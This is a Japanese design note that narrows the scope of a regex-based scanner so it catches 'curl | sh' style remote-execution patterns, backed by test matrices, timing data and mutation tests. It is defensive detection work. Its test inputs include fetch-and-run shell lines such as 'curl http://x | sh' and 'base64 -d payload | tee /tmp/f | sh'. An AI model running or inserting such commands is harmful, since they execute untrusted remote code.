# 設計 rev3: skill_vuln_scan の curl_pipe_sh 拡張（issue #566・A3/B1/B2 縮小版）

対象: `scripts/lib/skill_vuln_shell.py` のみ（`skill_vuln_scan.py` / `skill_vuln_flow.py` は無変更）。
rev3: 2026-08-27。**設計レビュー5巡到達によりユーザーが最終裁定**（巡5）: 「誤検出の原因を落として縮小マージ」。
対象を A3/B1/B2 の3件に縮小し、A1/A2/A4/B3 は前身 #566 の設計5巡を継承したまま `#571` へ切り出す。
`split_shell_command_units` の新設・flow 側の変更（同一行 fetch-file flow・flow dedup）は**すべて削除**した
（§2 で不要と実証）。**リポジトリのコードは無変更**（本 rev3 も設計文書のみ）。

---

## 0. rev2 からの縮小の理由（必読）

rev2（A1〜A4 + B1〜B3 全件対応）の巡5 レビューで、A1/A2/A4 を塞ぐために導入した「同一行 fetch-file flow」が
**誤検出を生むことが実測で確定**した:

```
HIT  CONTROL real combo (expect HIT) | flow: remote_exec_flow.fetch_file_to_exec
MISS CONTROL echo literal (expect MISS)
HIT  codex: echo argument           | flow: remote_exec_flow.fetch_file_to_exec   ← 誤検出
HIT  codex: printf argument         | flow: remote_exec_flow.fetch_file_to_exec   ← 誤検出
```

`curl http://x -o /tmp/f; echo sh /tmp/f` が HIT する。`echo sh /tmp/f` は文字列を表示するだけで shell を
実行しない。根本原因は「consumer がコマンド位置にあるかを検証していない」ことで、この検証は腰を据えて
`#571` で設計する。**A3/B1/B2 はこの機構を一切使わない**（§2 で実証）ため、縮小版は該当機構を持ち込まない。

---

## 1. round 0 の完成条件

- ①**守る対象**: `curl_pipe_sh` パターン（`skill_vuln_shell.py:84-91` 付近）が素通りする3つの既知入力を
  検出させること: **A3**（パイプ多段）・**B1**（wrapper の argv0 rename operand）・**B2**（PATH 相対
  多段パスの shell 実行主体）。**A1/A2/A4/B3 は対象外**（`#571` へ切り出し。前身 #566 の設計5巡を継承）。
- ②**信頼境界**: rev2 §1 の②をそのまま継承（静的・字句レベルで綴られた悪意あるスキル作者/事故コマンド。
  動的展開は境界外）。本 rev3 は②の記述自体を変更しない。
- ③**対象外**: A1（`;` 区切り）・A2（`&` 区切り）・A4（`--output` long 形）・B3（homoglyph）・
  `split_shell_command_units` の新設・flow 側の同一行 fetch-file 機構・flow dedup・
  `_exec_file_regexes` の単一ソース化（rev2 §3.3 の flow 側修正。A1/A2/A4 の flow 経路が本 rev3 に
  存在しないため対象外）・`SHELL_EXEC_SUBJECT` の O(n²) backtracking 根治（`#570`、既存問題で本変更が
  悪化させないことだけ §5 で示す）。
- ④**blocking の定義**:
  - (G1) 完成 matrix（§1.1）の全行が pytest で固定されること（HIT/MISS/FP/別issue の判定を持つ）
  - (G2) 実コーパス突合: findings・flow_findings とも **全フィールド不変**（増減0）。減少1件でも
    blocking、増加は TP/FP/unresolved に分類し FP・unresolved が1件でも blocking
  - (G3) 変更対象ファイル（`skill_vuln_shell.py`）が800行未満（実測 §4）
  - (G4) 陰性試験4クラス（要素を消す／意味を壊す／分散・入替／検査を無効化）各1件が pytest で赤化、
    陽性対照が緑のまま
  - (G5) 性能: 実コーパス before/after walltime を実測記録。**#570 の O(n²) 根治は本変更のマージ条件に
    しない**（頭の先行裁定を継承。§5.1 で単一呼出元の事実を自分で再確認）

### 1.1 完成 matrix（縮小後）

| # | 入力クラス | 代表入力 | 判定 | 実測（本ワーカー・取得時刻） |
|---|---|---|---|---|
| A3 | パイプ多段 | `curl X | tee /tmp/f | sh` | **HIT固定** `curl_pipe_sh` | HIT（§2.2 コマンド） |
| B1 | wrapper operand | `curl X | exec -a foo sh` | **HIT固定** `curl_pipe_sh` | HIT（§2.2） |
| B2 | PATH 相対多段 | `curl X | bin/sh` | **HIT固定** `curl_pipe_sh` | HIT（§2.2） |
| B2b | PATH 相対多段（深い） | `curl X | usr/bin/sh` | **HIT固定** `curl_pipe_sh` | HIT（§2.2） |
| ctrl-1 | 単一段パイプ（既存機能の回帰確認） | `curl X | sh` | **HIT固定（不変）** | HIT（§2.2） |
| ctrl-2 | wrapper operand なし（既存機能の回帰確認） | `curl X | exec sh` | **HIT固定（不変）** | HIT（§2.2） |
| ctrl-3 | 絶対パス（既存機能の回帰確認） | `curl X | /bin/sh` | **HIT固定（不変）** | HIT（§2.2） |
| ctrl-4 | echo literal（陽性対照） | `echo "curl X | sh"` | **非検出固定** | MISS（§2.2） |
| A1 | `;` 区切り | `curl X -o /tmp/f; sh /tmp/f` | **MISS固定 → 別issue #571**（前身5巡継承） | MISS（§2.4） |
| A2 | `&` 区切り | 同 `&` | **MISS固定 → 別issue #571** | MISS（§2.4） |
| A4 | `--output` long 形 | `curl X --output /tmp/f && sh /tmp/f` | **MISS固定 → 別issue #571** | MISS（§2.4） |
| A0 | `&&`（既存機能・回帰確認） | `curl X -o /tmp/f && sh /tmp/f` | **HIT固定（不変）** `download_and_run` | HIT（§2.4） |
| B3 | homoglyph | `curl X | ѕh`（キリル ѕ） | **MISS固定 → 別issue #571** | MISS（§2.4） |
| flow-canary | flow_findings 全体（回帰確認） | 実コーパス | **157件・全フィールド不変** | §3 |

**matrix に無い入力クラスが発見されたら、行を追加し判定を確定するまでマージ不可**（silence の禁止・
rev2 G1 の方式を継承）。

---

## 2. 前提の evidence

### 2.1 A3/B1/B2 が同一パターン（curl_pipe_sh）経由であることの裏取り（file:line）

| # | 裏取り |
|---|---|
| A3 原因 | `skill_vuln_shell.py:86`（本 PR 変更前）: `[^\n\|]*\|\s*{subject}` が最初の `\|` で早期終端し、
  `curl X \| tee /tmp/f \| sh` の2段目パイプへ到達できない |
| B1 原因 | `skill_vuln_shell.py:44` の `_WRAPPER_STEP` が `(?:{_OPTION}\|{_ASSIGNMENT})*` のみを許可し、
  `exec -a foo sh` の bare operand `foo` で切れる |
| B2 原因 | `skill_vuln_shell.py:16` の `_COMMAND_PATH` が `\.{1,2}/` または絶対 `/...` のみを許可し、
  先頭 `/` も `./` も無い `bin/sh` を認識しない |
| 3件とも同一パターン | いずれも `remote_exec.curl_pipe_sh`（`skill_vuln_shell.py:84-87`）1本の regex で
  マッチが試みられる。行内の他ステップに分割する必要がなく、`;`/`&`/`&&` の区切りも介在しない
  （プロトタイプの `_hit()` 走査結果で単一パターンのみが反応することを確認・§2.2） |

### 2.2 A3/B1/B2 の regex-level 実測（本ワーカー・プロトタイプ）

再現: `scripts/lib/skill_vuln_shell.py` の完全コピーに §3 のパッチを適用し、
`build_remote_exec_patterns()` を直接呼んで `regex.search(text)` を実行（コマンド全文は末尾に転記）。
取得: 2026-08-26T22:41:34Z 台（本ワーカーのセッションで実行）。

```
--- before（本番3ファイルの完全コピー、無変更） ---
A3  []                'curl http://x -o /dev/null | tee /tmp/f | sh'
B1  []                'curl http://x | exec -a foo sh'
B2  []                'curl http://x | bin/sh'
B2b []                'curl http://x | usr/bin/sh'
echo-literal []       'echo "curl http://x | sh"'

--- after（§3 のパッチ適用後） ---
A3  ['remote_exec.curl_pipe_sh']  'curl http://x -o /dev/null | tee /tmp/f | sh'
B1  ['remote_exec.curl_pipe_sh']  'curl http://x | exec -a foo sh'
B2  ['remote_exec.curl_pipe_sh']  'curl http://x | bin/sh'
B2b ['remote_exec.curl_pipe_sh']  'curl http://x | usr/bin/sh'
echo-literal []                  'echo "curl http://x | sh"'（陽性対照・不変）
ctrl-1 (curl X | sh)             ['remote_exec.curl_pipe_sh']（既存機能・不変）
ctrl-2 (curl X | exec sh)        ['remote_exec.curl_pipe_sh']（既存機能・不変）
ctrl-3 (curl X | /bin/sh)        ['remote_exec.curl_pipe_sh']（既存機能・不変）
```

再現コマンド（`probe_targets.py`。`skill_vuln_shell.py` を `before/`・`after/` へコピーし
`sys.path` 先頭に挿入して `build_remote_exec_patterns()` の各 regex に対し `.search(text)` を実行する
一意のスクリプト。全文は scratchpad `proto566cut/probe_targets.py` に保存済み）。

### 2.3 A1/A2/A4/B3 が未変化であることの確認（§2.2 と同一 harness・同一実行時刻帯）

```
A1 semicolon                       []
A2 ampersand                       []
A4 --output long                   []
A0 && baseline (既存・不変であるべき)  ['remote_exec.download_and_run']
B3 homoglyph (対象外)                []
```

`#571` へ切り出す4件はいずれも**本 PR 適用後も MISS のまま**（新規の後退でも新規の対応でもない）。
`A0`（既存 `&&` パターン）が変わらず HIT であることも確認し、`download_and_run` パターンに
一切手を入れていないことを裏付けた。

### 2.4 `split_shell_command_units` が不要であることの実証

**判定: 不要**。根拠:

1. §2.1 の file:line 裏取りが示すとおり、A3/B1/B2 はいずれも `curl_pipe_sh` という**単一の regex**が
   検出に失敗している問題で、コマンド境界を単位分割してから複数 unit を横断照合する機構
   （`split_shell_command_units`）を必要としない。3件とも「1本のパイプライン内」で完結し、
   `;`/`&`/`&&`/`||` のようなトップレベル区切りをまたがない。
2. rev2 で `split_shell_command_units` が必要だったのは A1/A2/A4（`curl X -o f; sh f` 型）を
   `download_and_run` 系の flow 検出へ合流させるためであり、その経路自体が誤検出の原因になった
   （§0）。A1/A2/A4 を対象外にした時点で、この機構を要求する側の対象が消える。
3. §3 のパッチは `skill_vuln_shell.py` の `_COMMAND_PATH` / `_WRAPPER_STEP` /
   `curl_pipe_sh` の3箇所の regex 修正のみで、`skill_vuln_scan.py`（行単位スキャンのループ）・
   `skill_vuln_flow.py`（フロー解析）を**一切変更していない**ことが §3.2 のパッチ全文で確認できる。
   `scan.py`/`flow.py` を触らずに §1.1 matrix の A3/B1/B2 行が全て HIT に変わったことは §2.2 で
   実測済みであり、「変更不要」の直接証拠になっている。

---

## 3. 設計本体（`skill_vuln_shell.py` の3箇所の regex 修正のみ）

### 3.1 方針

`split_shell_command_units` は新設しない。既存の `curl_pipe_sh` パターン1本を構成する3つの
サブ regex（パイプ多段・wrapper operand・PATH 相対パス）だけを、それぞれ最小限に拡張する。
`SHELL_EXEC_SUBJECT`（「実行主体の単一ソース」#562）は温存し、新しい代替 subject を作らない。

### 3.2 パッチ本体（差分。プロトタイプで実測済み・全文は scratchpad に保存済み）

```python
# --- A3: 多段パイプを許可する ---
# 変更前: rf"{_REMOTE_LINE_GUARD}.*\b(?:curl|wget|fetch)\b[^\n|]*\|\s*{subject}"
# 変更後:
rf"{_REMOTE_LINE_GUARD}.*\b(?:curl|wget|fetch)\b(?:[^\n|]*\|)+\s*{subject}"
# `(?:[^\n|]*\|)+` は「`|` を含まない文字列 + リテラル `|`」の1回以上の反復。
# 各反復の境界はリテラル `|` の実位置で確定するため曖昧さがなく（`[^\n|]*` は `|` を含まない
# ので反復間でオーバーラップしない）、パイプ段数に対して線形。

# --- B1: exec -a NAME のような argv0 rename operand を許可する ---
_OPTION_WITH_OPERAND = r"(?:-a\s+[^\s|;&()<>]+)"
_WRAPPER_STEP = (
    rf"(?:{_WRAPPER_COMMAND}"
    rf"(?:\s+(?:{_OPTION_WITH_OPERAND}|{_OPTION}|{_ASSIGNMENT}))*\s+)"
)
# `-a` に限定してスコープを狭める（「任意のオプションが bare operand を取ってよい」に緩めると
# オプションループが任意の後続語を飲み込む）。

# --- B2: PATH 相対多段パスを shell 実行主体語に限定して許可する ---
_COMMAND_PATH_RELATIVE = r"(?:[A-Za-z0-9._+-]+/)+"

def _static_command(names, path=_COMMAND_PATH):
    return path + "(?:" + "|".join(_static_shell_word(n) for n in names) + ")"

_SHELL_COMMAND = _static_command(
    ("tcsh", "bash", "zsh", "ksh", "dash", "dsh", "ash", "csh", "sh"),
    path=rf"(?:{_COMMAND_PATH}|{_COMMAND_PATH_RELATIVE})",
)
# _WRAPPER_COMMAND / _SUDO_STEP / _NICE_STEP / _BUSYBOX_STEP / _XARGS_STEP / _TIMEOUT_STEP は
# 従来どおり _COMMAND_PATH のみ（相対多段パスを許可しない）。理由は §5.2。
```

### 3.3 B2 のスコープを shell 実行主体語だけに限定した理由（性能・FP 両面）

rev2 の `_COMMAND_PATH` 拡張は `_static_command` の**全呼び出し**（`_SHELL_COMMAND` だけでなく
`_WRAPPER_COMMAND`/`_SUDO_STEP`/`_NICE_STEP`/`_BUSYBOX_STEP`/`_XARGS_STEP`/`_TIMEOUT_STEP` すべて）に
及んでいた。これを検証したところ、実コーパス walltime が **62.1s → 103.2s（+66%）** に悪化した
（§5.1 のアブレーション実測）。B2 が検出すべき対象は「PATH 相対パスで**直接起動される shell**」
（脅威の本体）であり、`sudo`/`nice`/`busybox`/`xargs`/`timeout` のような wrapper コマンドが
PATH 相対多段パスで綴られるケースは実コーパスにもテストケースにも現れず、検出価値を持たない。
**shell 実行主体語（`_SHELL_COMMAND`）だけに絞る**ことで、同じ3件の HIT を維持したまま
walltime 悪化を **62.2s → 68.9s（+10.7%）** まで抑えられることを実測した（§5.1）。

---

## 4. 行数（G3）

取得: 2026-08-26T22:41Z 台（本ワーカーのプロトタイプでの `wc -l`。実装 PR では本番3ファイルに対し
同じ diff を適用した上で再実測する）。

| ファイル | 変更前 | 変更後 | 残余（800行上限まで） |
|---|---|---|---|
| `skill_vuln_shell.py` | 340 | **365**（+25） | 435 |
| `skill_vuln_scan.py` | 721 | **721（無変更）** | 79 |
| `skill_vuln_flow.py` | 141 | **141（無変更）** | 659 |

分割計画は不要（3ファイルとも500行の分割検討ラインにも達しない）。

---

## 5. 性能（G5）

### 5.1 実コーパス walltime（本ワーカー実測）

再現: `scan_skills(Path.home() / ".claude")` を `before/`（本番無変更コピー）・`after/`（§3 パッチ適用済み
コピー）それぞれに対して直接呼び出し、`time.monotonic()` で計測。対象コーパスは 2026-08-26 時点の
`~/.claude/skills` 配下 1351 ファイル（同一マシン・同一取得セッション。ファイル数は環境依存で
再現時に変わりうる）。

```
=== paired before/after run, 2026-08-26T22:37:37Z ===
BEFORE walltime=62.246s scanned=1351 findings=6 flows=157
AFTER  walltime=68.888s scanned=1351 findings=6 flows=157
2026-08-26T22:39:48Z
```

**+10.7%**（62.2s → 68.9s）。§3.3 のスコープ限定を行わず `_COMMAND_PATH` を全 `_static_command`
呼び出し共通で拡張した場合は **+66%**（62.1s → 103.2s、取得 2026-08-26T22:32:48Z・22:34:24Z台）に
悪化することをアブレーションで確認済み（scratchpad `isolate_slow.py` / 個別 walltime 計測ログに
再現コマンド保存）。§3.2 の設計（B2 を shell 実行主体語のみへ限定）はこの実測に基づく。

### 5.2 呼出元の再確認（頭の先行裁定の継承）

```
$ grep -rn "scan_skills" scripts hooks --include="*.py" | grep -v "/tests/"
scripts/lib/skill_vuln_scan.py:625:def scan_skills(root: Path) -> SkillVulnReport:
scripts/lib/audit/sections_skill_vuln.py:33:        return skill_vuln_scan.scan_skills(proj)
```

取得: 2026-08-26T22:39:56Z（本ワーカーが独立に再実行して確認）。呼出元は
`sections_skill_vuln.py:33` の1箇所のみで、hook からは呼ばれない（対話をブロックしない）。
先行裁定（rev2・頭の裁定1）「性能悪化は本 issue のマージ条件にしない」をそのまま継承する。
**#570（`SHELL_EXEC_SUBJECT` の O(n²) backtracking 根治）は本 PR のマージ条件にしない**。

### 5.3 O(n²) を悪化させないことの確認

長大セグメント入力（2000セグメント）に対する regex-level 実測（取得 2026-08-26T22:41:34Z /
比較対象 before は 22:41:45Z）:

```
              before      after（§3 パッチ）
abs2000（絶対パス・既存）  1.873s      2.593s（+38%）
rel2000（相対パス・B2対象） 1.892s(MISS)  2.612s（+38%・新規 HIT）
```

絶対パス側も一律 +38% になっているのは `_SHELL_COMMAND` の alternation 数が1つ増えたことによる
定数倍のコストで、次数（オーダー）自体は変えていない（2000セグメント入力でも数秒で完走し
`#570` が扱う「打ち切り上限（cap）」設計を必須にしない）。rev2 で報告された「相対パス2000segが
2.3倍悪化」（1.359→3.095s）は `_COMMAND_PATH` を全 `_static_command` 呼び出しへ広げた設計の値であり、
§3.3 のスコープ限定によりこの増加率は解消されている。

---

## 6. 実コーパス突合（G2）

取得: 2026-08-26T22:37:30Z台（`run_corpus.py` で `before`/`after` それぞれの
`(rel_path, line, pattern_id, category, severity, snippet)` タプル list と
`(rel_path, producer_line, consumer_line, pattern_id, var)` タプル list を出力しファイル diff）。

```
before: scanned=1351 errors=[] evaluated=True findings=6 flows=157
after : scanned=1351 errors=[] evaluated=True findings=6 flows=157
diff before_findings.txt after_findings.txt  → 差分なし（IDENTICAL）
diff before_flows.txt    after_flows.txt     → 差分なし（IDENTICAL）
```

**findings・flow_findings とも全フィールド不変・増減0**。新規 FP は0件（G2 充足）。

---

## 7. 陰性試験・陽性対照（G4）

`verify-checks-by-breaking.md` の4クラス（①要素を消す ②語は残して意味を壊す ③分散・入替
④検査を無効化）各1件を pytest で実行し、全て赤化を確認した（本ワーカーが実際に mutation を
適用して実行。全文は scratchpad `test_mutation_566cut.py` + 4変異ディレクトリに保存済み）。

| # | クラス | 変異内容 | 対象 | 結果 |
|---|---|---|---|---|
| M1 | ①要素を消す | `(?:[^\n\|]*\|)+` → `[^\n\|]*\|`（`+` を除去） | A3 | **RED**: `test_a3_multistage_pipe_hits` failed。他7件 green |
| M2 | ②語は残して意味を壊す | `_OPTION_WITH_OPERAND` の `-a` を `-z` に変更（構造は残し対象フラグを外す） | B1 | **RED**: `test_b1_exec_dash_a_operand_hits` failed。他7件 green |
| M3 | ③分散・入替 | `_COMMAND_PATH_RELATIVE` を `_SHELL_COMMAND` から `_WRAPPER_COMMAND` へ付け替え（スコープの入替） | B2 | **RED**: `test_b2_relative_multisegment_hits` failed。陽性対照 `test_b2_control_absolute_path_still_hits` は green（付け替えが絶対パス既存機能を壊していないことも確認） |
| M4 | ④検査を無効化 | `curl_pipe_sh` パターンをカタログから削除 | 全体 | **RED**: A3/B1/B2 + 単一段/wrapper無し/絶対パスの制御群まで6件 failed（検査全体が無効化されたことを広く検出） |

陽性対照（変異なしの baseline）: 8件 all green（`echo` literal 非検出・単一段パイプ既存機能・
wrapper operand なし既存機能・絶対パス既存機能・`download_and_run` パターン在存の回帰カナリアを含む）。

実行ログ（要旨。全文は取得コマンドとともに scratchpad 保存）:

```
=== after (baseline) ===        8 passed
=== mut_m1_a3_revert ===        1 failed (test_a3_multistage_pipe_hits), 7 passed
=== mut_m2_b1_wrongflag ===     1 failed (test_b1_exec_dash_a_operand_hits), 7 passed
=== mut_m3_b2_scope_swap ===    1 failed (test_b2_relative_multisegment_hits), 7 passed
=== mut_m4_disable_curlpipe === 6 failed, 2 passed
```

実装 PR ではこれらを `scripts/lib/tests/test_skill_vuln_shell.py`（または新規テストファイル）へ
そのまま移植する。

---

## 8. リスクと未解決

- **B1 のスコープ（`-a` 限定）が狭すぎる可能性**: `env` コマンドは実際には `-a` オプションを
  持たない（GNU env の argv0 rename は無い）。`-a` は主に `exec`（bash builtin）向けだが、
  regex 側では wrapper 名を区別せず一律に許可している。過剰検出方向（安全側）であり、
  「`env -a foo sh` が HIT する」は誤検出ではあるが combo（curl 経由の shell 実行）自体は
  本物であるため実害は小さいと判断した。将来 wrapper 別にオプション文法を分離する余地は残る。
- **B2 のスコープ限定（§3.3）は shell 実行主体語のみ**: 相対パス許容は
  `_SHELL_COMMAND` にだけ適用し、`_WRAPPER_COMMAND` 側は `_COMMAND_PATH` のままとする
  （全 wrapper に広げると実コーパス walltime が +66% 悪化するため）。したがって
  **wrapper 自身が PATH 相対パスで綴られるケース `curl X | bin/sudo sh` は検出対象外**。
  逆に **shell 側が相対の `curl X | sudo bin/sh` は検出される**。
  実測（2026-08-26T23:4xZ・`scan_skills()` 経由）:

  ```
  HIT  curl http://x | sudo bin/sh   → remote_exec.curl_pipe_sh
  MISS curl http://x | bin/sudo sh
  ```

  両方向を matrix の `B2-scope-shell-relative-hits` / `B2-scope-wrapper-relative-misses` で
  固定した（スコープを広げると後者が赤くなる）。
  **rev3 初版はこの2ケースの説明が逆だった**（PR #574 の実装レビューで指摘を受け実測して訂正）。
- **A3 は「curl の多段パイプ」ではなく「多段パイプ」の性質**: 初版は `curl_pipe_sh` だけを
  多段化し、構造がまったく同じ `base64_pipe_sh` を単段のまま残していた。
  `base64 -d payload | tee /tmp/f | sh` が素通りする非対称が生じるため、
  **同じ1行変更を base64 側にも適用した**（PR #574 の実装レビュー指摘・実測で裏取り済み）。
  matrix に `A3b-*` 5行（多段3件＋単段対照＋echo literal 対照）を追加して固定した。
- rev2 で発見された既存穴（`|&`・入れ子実行文脈内 combo・blockquote 内 fence・継続行 quirk・
  `memory_guard.scan_text` 正規化）は本 rev3 でも**すべて対象外のまま**。
  **`#572` として起票済み**（rev2 §10 のリストを引き継いだ）。

---

## 9. 参照

- 実測スクリプト・変異ディレクトリ一式: scratchpad `proto566cut/`
  （`before/` `after/` `mut_m1_a3_revert/` `mut_m2_b1_wrongflag/` `mut_m3_b2_scope_swap/`
  `mut_m4_disable_curlpipe/` `run_corpus.py` `probe_targets.py` `test_mutation_566cut.py`
  `isolate_slow.py`）。実装 PR 着手時に同一手順で本番3ファイルへ再実行し、値の再現を確認すること。
- 前身 rev2（A1〜A4+B1〜B3 全件版・巡4まで）: `git log` で本ファイルの旧版参照、または
  PR/issue #566 のコメント履歴。
